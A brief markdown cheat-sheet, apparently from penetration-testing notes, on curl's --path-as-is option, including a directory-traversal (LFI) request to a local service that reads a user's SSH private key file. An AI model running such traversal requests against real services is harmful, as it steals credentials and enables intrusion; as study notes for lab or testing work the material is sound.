# curl

---

## Syntax

```
curl --path-as-is http://192.168.45.203/
```

## Internal Curl on running services with LFI

```
curl --path-as-is localhost:4444/../../../../../../../../home/anthony/.ssh/id_rsa
```
